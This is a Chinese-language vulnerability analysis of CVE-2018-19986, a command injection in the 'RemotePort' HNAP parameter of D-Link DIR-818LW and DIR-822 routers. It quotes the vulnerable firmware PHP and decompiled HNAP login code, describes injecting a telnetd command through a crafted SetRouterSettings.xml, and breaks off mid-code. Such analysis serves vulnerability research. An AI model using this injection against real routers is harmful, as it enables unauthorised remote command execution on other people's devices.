<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X65818786a53ae3b3e8c7d3dd67a29859ef63875"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-19986</span><span class="csECDA2D3">）</span><span class="csDE05BCC">D-Link DIR-818LW&amp;828</span><span class="csECDA2D3">命令注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">D-Link DIR-822</span><span class="cs9C1B1871">和</span><span class="cs8926E06">D-Link DIR-818LW</span><span class="cs9C1B1871">都是中国台湾友讯（</span><span class="cs8926E06">D-Link</span><span class="cs9C1B1871">）公司的一款无线路由器。</span><span class="cs8926E06"> D-Link DIR-818LW Rev.A 2.05.B03</span><span class="cs9C1B1871">和</span><span class="cs8926E06">DIR-822 B1 202KRb06</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">&lsquo;RemotePort&rsquo;</span><span class="cs9C1B1871">参数存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">D-Link DIR-818LW Rev.A 2.05.B03</span></p><p class="cs40DD2BC9"><span class="cs8926E06">DIR-822 B1 202KRb06</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<h4 class="cs868C439D">
			<a name="原理"><span class="cs6EDCDAE2">原理</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">D-Link DIR-818LW Rev.A 2.05.B03</span><span class="cs9C1B1871">和</span><span class="cs8926E06">DIR-822 B1 202KRb06</span><span class="cs9C1B1871">中，通过</span><span class="cs8926E06">HNAP1</span><span class="cs9C1B1871">协议访问</span><span class="cs9FB05234">SetRouterSettings</span><span class="cs9C1B1871">时，</span><span class="cs9FB05234">RemotePort</span><span class="cs9C1B1871">参数存在操作系统命令注入漏洞。在</span><span class="cs9FB05234">SetRouterSettings.php</span><span class="cs9C1B1871">源码中，</span><span class="cs9FB05234">RemotPort</span><span class="cs9C1B1871">参数没有经过任何检查，直接存放于</span><span class="cs9FB05234">$path_inf_wan1.&quot;/web&quot;</span><span class="cs9C1B1871">，并且在</span><span class="cs9FB05234">iptwan.php</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">IPTWAN_build_command</span><span class="cs9C1B1871">函数中使用</span><span class="cs9FB05234">$path_inf_wan1.&quot;/web&quot;</span><span class="cs9C1B1871">变量作为</span><span class="cs9FB05234">iptables</span><span class="cs9C1B1871">的参数，同样未做检查。构造</span><span class="cs9FB05234">SetRouterSettings.xml</span><span class="cs9C1B1871">，使</span><span class="cs9FB05234">RemotePort</span><span class="cs9C1B1871">中包含如</span><span class="cs9FB05234">telnetd</span><span class="cs9C1B1871">的</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">命令，利用该漏洞执行非法操作系统命令。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">./etc/templates/hnap/SetRouterSettings.php</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$path_inf_wan1 = XNODE_getpathbytarget(&quot;&quot;, &quot;inf&quot;, &quot;uid&quot;, $WAN1, 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#$WAN1 &nbsp;= &quot;WAN-1&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$nodebase=&quot;/runtime/hnap/SetRouterSettings/&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$remotePort = query($nodebase.&quot;RemotePort&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">set($path_inf_wan1.&quot;/web&quot;, $remotePort);</span></p><p class="cs40DD2BC9"><span class="cs8926E06">./etc/services/IPTABLES/iptwan.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">function IPTWAN_build_command($name){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$path = XNODE_getpathbytarget(&quot;&quot;, &quot;inf&quot;, &quot;uid&quot;, $name, 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$web = query($path.&quot;/web&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;#web</span><span class="cs7FFD2630">作为</span><span class="cs9FB05234">iptables</span><span class="cs7FFD2630">的参数写入</span><span class="cs9FB05234">$_GLOBALS[&quot;START&quot;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if (query($path.&quot;/inbfilter&quot;) != &quot;&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$inbfn = cut(query($path.&quot;/inbfilter&quot;), 1, &quot;-&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$hostip = query($path.&quot;/weballow/hostv4ip&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($hostip != &quot;&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (query($path.&quot;/inbfilter&quot;)!=&quot;&quot;) fwrite(&quot;a&quot;,$_GLOBALS[&quot;START&quot;], $iptcmd.&quot; -p tcp --dport &quot;.$web.&quot; &quot;.&quot;-j CK_INBOUND&quot;.$inbfn.&quot;\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite(&quot;a&quot;,$_GLOBALS[&quot;START&quot;], $iptcmd.&quot; -s &quot;.$hostip.&quot; -p tcp --dport &quot;.$web.&quot; -j ACCEPT\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (query($path.&quot;/inbfilter&quot;)!=&quot;&quot;) fwrite(&quot;a&quot;,$_GLOBALS[&quot;START&quot;], $iptcmd.&quot; -p tcp --dport &quot;.$web.&quot; &quot;.&quot;-j CK_INBOUND&quot;.$inbfn.&quot;\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite(&quot;a&quot;,$_GLOBALS[&quot;START&quot;], $iptcmd.&quot; -p tcp --dport &quot;.$web.&quot; -j ACCEPT\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">PS</span><span class="cs9C1B1871">：服务器的</span><span class="cs8926E06">web</span><span class="cs9C1B1871">目录为</span><span class="cs8926E06">/htdocs/web/</span></p><h4 class="cs868C439D">
			<a name="关于hnap"><span class="cs6EDCDAE2">关于</span><span class="csBF12A472">HNAP</span></a></h4>
		<p class="cs6FD73CFB"><span class="cs8926E06">The Home Network Administration Protocol (HNAP) is an HTTP-Simple Object Access Protocol (SOAP)-based protocol that can be implemented inside of network devices to allow advanced programmatic configuration and management by remote entities.</span></p><p class="cs40DD2BC9"><span class="cs8926E06">HNAP</span><span class="cs9C1B1871">是由</span><span class="cs8926E06">Pure Networks</span><span class="cs9C1B1871">开发的协议，后续由</span><span class="cs8926E06">Cisco</span><span class="cs9C1B1871">管理与开发。</span><span class="cs8926E06">HNAP</span><span class="cs9C1B1871">用于网络设备之间的交互，该协议基于</span><span class="cs8926E06">SOAP</span><span class="cs9C1B1871">和</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">，以</span><span class="cs8926E06">post</span><span class="cs9C1B1871">的方式发包。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">HNAP</span><span class="cs9C1B1871">：在</span><span class="cs8926E06">HTTP header</span><span class="cs9C1B1871">中加入</span><span class="cs8926E06">SOAPAction</span><span class="cs9C1B1871">，该字段中会指明请求的操作，如</span><span class="cs8926E06">Login</span><span class="cs9C1B1871">，并向</span><span class="cs8926E06"><a class="cs508254C" href="http://%5Bip%5D/HNAP1发送数据，数据形式为xml。"><span class="cs4B51D5E4">http://[ip]/HNAP1</span><span class="cs1C2E50E7">发送数据，数据形式为</span><span class="cs4B51D5E4">xml</span><span class="cs1C2E50E7">。</span></a></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">举个栗子，下图是登录时的抓包：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">192.168.0.1</span><span class="cs9C1B1871">向路由器</span><span class="cs8926E06">192.168.0.2</span><span class="cs9C1B1871">发送数据，在</span><span class="cs8926E06">SOAPAction</span><span class="cs9C1B1871">中指定了请求内容。</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/D-Link/%ef%bc%88CVE-2018-19986%ef%bc%89D-Link%20DIR-818LW&828%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="499" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">路由器收到之后以</span><span class="cs8926E06">LoginResponse</span><span class="cs9C1B1871">回复发送方，返回了一些登录需要的关键数据</span><span class="cs8926E06">.</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/D-Link/%ef%bc%88CVE-2018-19986%ef%bc%89D-Link%20DIR-818LW&828%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="495" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发送方收到之后，</span><span class="cs8926E06">login</span><span class="cs9C1B1871">的</span><span class="cs8926E06">action</span><span class="cs9C1B1871">由</span><span class="cs8926E06">request</span><span class="cs9C1B1871">变成了</span><span class="cs8926E06">login</span><span class="cs9C1B1871">，即发送用户名密码的过程，密码是由用户私钥处理过的数据。</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/D-Link/%ef%bc%88CVE-2018-19986%ef%bc%89D-Link%20DIR-818LW&828%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="499" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">路由器验证登录的用户名和密码，返回登录成功信息。</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/D-Link/%ef%bc%88CVE-2018-19986%ef%bc%89D-Link%20DIR-818LW&828%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="349" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="理解hnap"><span class="cs6EDCDAE2">理解</span><span class="csBF12A472">HNAP</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">为了再深入理解</span><span class="cs8926E06">HNAP</span><span class="cs9C1B1871">，查看</span><span class="cs8926E06">/htdocs/cgibin</span><span class="cs9C1B1871">二进制文件，简化流程如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">hnap_main(){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;memset(acStack1708,0,0x100);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;getenv(&quot;HTTP_AUTHORIZATION&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;soapaction = getenv(&quot;HTTP_SOAPACTION&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;request_method = getenv(&quot;REQUEST_METHOD&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;hnap_auth = getenv(&quot;HTTP_HNAP_AUTH&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;cookie = getenv(&quot;HTTP_COOKIE&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;referer = getenv(&quot;HTTP_REFERER&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;memset(php_path,0,0x100);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;//</span><span class="cs7FFD2630">当未指定</span><span class="cs9FB05234">soapaction</span><span class="cs7FFD2630">时，默认请求为</span><span class="cs9FB05234">GetDeviceSettings</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if (soapaction == (char *)0x0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;soapaction = &quot;http://purenetworks.com/HNAP1/GetDeviceSettings&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__s1 = strstr(soapaction,&quot;http://purenetworks.com/HNAP1/Login&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (__s1 != (char *)0x0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parse_param_value(uVar2,&quot;Action&quot;,action);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parse_param_value(uVar2,&quot;Username&quot;,username);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parse_param_value(uVar2,&quot;LoginPassword&quot;,pwd);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parse_param_value(uVar2,&quot;Captcha&quot;,captcha);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iVar1 = strcmp(action,&quot;request&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">当</span><span class="cs9FB05234">action</span><span class="cs7FFD2630">为</span><span class="cs9FB05234">request</span><span class="cs7FFD2630">时</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (iVar1 == 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">产生一个长度为</span><span class="cs9FB05234">0X32</span><span class="cs7FFD2630">的随机字符串</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">例：</span><span class="cs9FB05234">LVy04tz2fCRlZIu8vefr1OCKu9qTOQaktWkwOhy3rNnQfhWaKB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;get_random_string(random_string,0x32);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//cookie_value</span><span class="cs7FFD2630">为前十个字符</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">例：</span><span class="cs9FB05234">LVy04tz2fC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strncpy(cookie_value,random_string,10);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//challenge</span><span class="cs7FFD2630">为接下来</span><span class="cs9FB05234">20</span><span class="cs7FFD2630">个字符</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">例：</span><span class="cs9FB05234">RlZIu8vefr1OCKu9qTOQ</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strncpy(random_challenge,random_string_10,0x14);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//public key</span><span class="cs7FFD2630">为接下来</span><span class="cs9FB05234">20</span><span class="cs7FFD2630">个字符</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">例：</span><span class="cs9FB05234">aktWkwOhy3rNnQfhWaKB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strncpy(public_key,random_string_30,0x14);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sprintf(public_key_and_0,&quot;%s%s&quot;,public_key,0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcpy(COOKIE,cookie_value);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcpy(CHALLENGE,random_challenge);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//HMAC_MD5</span><span class="cs7FFD2630">就是常见的</span><span class="cs9FB05234">HMAC</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">hash</span><span class="cs7FFD2630">算法为</span><span class="cs9FB05234">MD5</span><span class="cs7FFD2630">。这里函数的输出放在第三个参数中</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">例：</span><span class="cs9FB05234">hmac_1=E188583458DE427B6A71C2DD04CB632C</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HMAC_MD5(random_challenge,public_key_and_0,hmac_1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//set challenge,privatekey,captcha</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">soap xml</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}//end of action=request</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(strcmp(action,&quot;login&quot;)==0 &amp;&amp; cookie !=0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;find_uid = strstr(cookie,&quot;uid=&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (find_uid == (char *)0x0) goto LAB_004137fc;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">获取</span><span class="cs9FB05234">cookie</span><span class="cs7FFD2630">的值</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strncpy(cookie_value,find_uid + 4,10);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">检查</span><span class="cs9FB05234">cookie</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__fd=get_cgdata_by_uid(acStack1904,cookie_value);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (__fd &lt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 